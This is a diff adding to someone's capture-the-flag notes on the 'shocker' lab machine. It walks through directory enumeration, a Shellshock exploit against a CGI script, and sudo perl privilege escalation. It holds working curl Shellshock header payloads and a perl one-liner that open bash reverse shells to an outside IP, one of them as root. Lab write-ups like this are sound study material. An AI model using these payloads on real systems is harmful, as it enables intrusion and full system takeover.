@@ -1,5 +1,9 @@
 # shocker, flow
 
+## summary
+
++ hard to know the cgi shellshock vuln. (to know apache parse header as env, and the env parsing lead to a bash vulnerability.)
+
 ## prev enum
 
 ```sh
@@ -62,4 +66,36 @@ gobuster dir -u http://shocker/ -w $dict -t 20 -e -x php,asp,json,aspx
 gobuster dir -u http://shocker/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 20 -e -x cgi,sh,pl,py,rb,php
   # 5min
   # find /user.sh (status 200)
+```
+
+## shellshock
+
++ ref: (shellshock basic) [https://fedoramagazine.org/shellshock-how-does-it-actually-work/]
+
+```sh
+env x='() { :;}; echo OOPS' bash -c :
+  # env is inherited among shells.
+  # the command is executed during importing.
+```
+
+```sh
+curl -H "C: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.3/1337 0>&1" http://shocker/cgi-bin/user.sh
+curl http://shocker/cgi-bin/user.sh -H "X-ABC: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.3/1337 0>&1" 
+```
+
+## post enum
+
+```sh
+ps aux # nothing interesting
+sudo -l
+  # User shelly may run the following commands on Shocker:
+  #    (root) NOPASSWD: /usr/bin/perl
+```
+
+## privilege escalation
+
+```sh
+perl -e "system('echo 123')"
+sudo perl -e 'use Socket;$i="10.10.16.3";$p=1339;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+  # perl reverse shell -> root
 ```
